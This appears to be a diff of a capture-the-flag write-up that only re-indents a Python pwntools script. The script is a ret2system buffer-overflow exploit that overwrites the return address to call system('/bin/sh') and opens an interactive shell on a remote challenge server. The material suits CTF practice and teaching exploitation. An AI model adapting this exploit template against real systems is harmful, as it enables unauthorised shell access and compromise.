@@ -22,26 +22,26 @@ system('/bin/bash')
   ```python
   from pwn import *
 
-exe = "./bofme" # replace by your binary
-elf = context.binary = ELF(exe)
-context.log_level = 'debug'
-############################## to be replaced###############
-offset = 40 # to be replaced
-ret_addr = 0x00000000004004d1 # to be replaced 
-system_addr = elf.symbols['do_system'] #plt system address
-bin_sh_addr = 0x400744 #  0x7ffff7f5404f 
-############################################################
+  exe = "./bofme" # replace by your binary
+  elf = context.binary = ELF(exe)
+  context.log_level = 'debug'
+  ############################## to be replaced###############
+  offset = 40 # to be replaced
+  ret_addr = 0x00000000004004d1 # to be replaced 
+  system_addr = elf.symbols['do_system'] #plt system address
+  bin_sh_addr = 0x400744 #  0x7ffff7f5404f 
+  ############################################################
 
-payload = flat({offset: [ ret_addr,  system_addr,  bin_sh_addr]})
-with open("payload.txt", "bw") as f:
+  payload = flat({offset: [ ret_addr,  system_addr,  bin_sh_addr]})
+  with open("payload.txt", "bw") as f:
     f.write(payload)
 
-#ps = process(exe) # or use remote
-ps = remote('0.cloud.chals.io', 27380)
-#22ps.sendlineafter('time',payload)
-#print(dir(ps))
-ps.sendlineafter(b'time', payload)
-ps.interactive()
+  #ps = process(exe) # or use remote
+  ps = remote('0.cloud.chals.io', 27380)
+  #22ps.sendlineafter('time',payload)
+  #print(dir(ps))
+  ps.sendlineafter(b'time', payload)
+  ps.interactive()
 ```
 <br>
 <br>
